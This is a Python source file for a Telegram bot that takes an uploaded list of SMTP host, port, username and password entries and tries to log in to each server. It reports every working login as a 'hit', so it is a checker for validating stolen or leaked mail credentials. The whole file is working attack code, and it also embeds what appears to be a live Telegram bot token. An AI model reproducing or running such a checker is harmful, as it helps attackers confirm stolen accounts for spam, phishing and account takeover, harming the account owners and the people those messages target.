import telebot
import smtplib

bot = telebot.TeleBot('6219231457:AAEUOKdN_zSDYsl-IKz_BZ0K6CEJd2kP_NA')

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, 'PLEASE SEND ME smtp.txt \nSEND FILE FOR CHACK SMTP \nIF YOU NEW USER PLEASE TYPE /help')
@bot.message_handler(commands=['help'])
def start_message(message):
    bot.send_message(message.chat.id, 'PLEASE MAKE YOUR WORDLIST \bFIRST GO TO YOUR NOTEPAD \nPUT YOUR SMTP THIS FORMAT \nHOST|PORT|USER|PASSWORD \nTHEN SAVE FILE AND RENAME smtp.txt \nTHEN SEND YOUR smtp.txt FILE TO BOT')

# Handler for document messages
@bot.message_handler(content_types=['document'])
def handle_document(message):
    # Get the file ID
    file_id = message.document.file_id

    # Download the file
    file_info = bot.get_file(file_id)
    file_path = file_info.file_path
    downloaded_file = bot.download_file(file_path)

    # Convert the file content to string
    file_content = downloaded_file.decode('utf-8')

    # Split the content by lines
    lines = file_content.split('\n')

    # Iterate over the lines
    for line in lines:
            host, port, user, passwd = line.split('|')
            try:
                smtp_obj = smtplib.SMTP(host, port)
                smtp_obj.starttls()
                smtp_obj.login(user, passwd)
                bot.send_message(message.chat.id, f'💠 NEW HIT VALID SMTP ✅ \n✅ Host :- {host} \n✅ Port :- {port} \n✅ User :- {user} \n✅ Password :- {passwd} \n💠 Dev :- MR.KRISANJIT 💠', parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f'❎ INVALID SMTP ❎ \n❌ Host :- {host} \n❌ Port :- {port} \n❌ User :- {user} \n❌ Password :- {passwd} \n💠 Dev :- MR.KRISANJIT 💠', parse_mode='Markdown')

bot.infinity_polling()
